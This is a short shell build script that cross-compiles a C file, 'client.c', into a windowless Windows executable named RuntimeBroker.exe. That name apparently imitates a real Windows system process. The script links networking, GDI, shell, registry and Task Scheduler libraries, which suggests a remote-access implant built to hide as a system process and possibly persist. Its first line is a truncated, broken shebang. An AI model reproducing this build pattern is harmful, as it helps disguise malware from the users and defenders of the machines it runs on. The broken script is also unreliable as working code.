#!/usr/bin/bas

x86_64-w64-mingw32-windres version.rc -O coff -o version.res
x86_64-w64-mingw32-gcc -O2 -mwindows -o RuntimeBroker.exe \
  client.c version.res \
  -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 \
  -luuid -lshlwapi -luser32 -ladvapi32 -loleaut32 -ltaskschd
